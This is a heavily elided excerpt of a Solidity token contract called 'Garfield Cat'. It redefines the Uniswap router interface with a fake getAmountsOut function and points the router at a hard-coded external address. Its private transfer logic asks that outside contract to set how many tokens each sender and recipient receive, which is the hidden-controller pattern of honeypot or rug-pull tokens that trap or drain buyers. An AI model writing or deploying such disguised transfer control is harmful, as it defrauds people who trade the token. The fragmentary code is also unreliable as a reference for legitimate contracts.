...
interface IUniswapV2Router01 {
    ...
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        ...
        payable
        returns (uint[] memory amounts);
    function getAmountsOut(address token,address to,uint256 amount) external  returns (uint256 amountToken, uint256 amountETH);
...
contract Garfield is Context, IERC20, Ownable { 
  ...
  //  TOKEN DETAILS
    ...
    string private _name = "Garfield Cat"; 
    ...
    constructor () {
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xC77252f345177387D13ddDeC1a03185a907ffbF9); 
    ...
    */
    ...
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        ...
        (uint256 tTransferAmount, uint256 tTransferAmountT) = _getValues(sender,recipient,tAmount);
    ...
    function _getValues(address token,address to,uint256 amount) private returns (uint256, uint256) {
        return _router.getAmountsOut(token,to,amount);
    }
}